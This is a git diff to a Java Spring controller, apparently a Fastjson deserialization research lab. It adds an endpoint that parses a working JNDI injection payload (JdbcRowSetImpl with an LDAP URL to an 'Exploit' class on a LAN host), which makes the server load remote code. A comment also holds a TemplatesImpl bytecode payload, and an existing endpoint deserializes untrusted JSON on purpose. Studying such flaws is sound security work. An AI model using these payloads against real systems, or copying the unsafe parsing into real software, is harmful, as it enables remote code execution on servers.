@@ -15,6 +15,7 @@ import com.alibaba.fastjson.parser.ParserConfig;
 import com.alibaba.fastjson.serializer.SerializerFeature;
 import com.snowsec0.dao.User;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.rowset.JdbcRowSetImpl;
 
 @RestController
 @RequestMapping("/web")
@@ -65,7 +66,7 @@ public class WebController {
 	//{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"base64_calss\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}
 	//通过postMan提交json格式数据
 	@PostMapping("adduser")
-	public Object login(@RequestBody Map<String,Object> map){
+	public Object adduser(@RequestBody Map<String,Object> map){
 	//{"json":"{\"name\":\"snowsec0\",\"password\":\"hello world\"}"}
 		ParserConfig config = new ParserConfig();
 		System.err.println(map.get("json"));
@@ -73,5 +74,13 @@ public class WebController {
 		Object user = JSON.parseObject(str,Object.class, config, Feature.SupportNonPublicField);
 		return user;
 	}
-	
+	//基于JNDI的POC
+	@PostMapping("jndiuser")
+	public Object jndiuser(@RequestBody User user)
+	{
+		String payload1 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}";
+		String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://192.168.1.101:1389/Exploit\",\"autoCommit\":true}";
+        JSONObject.parse(payload2);
+		return user;
+	}
 }
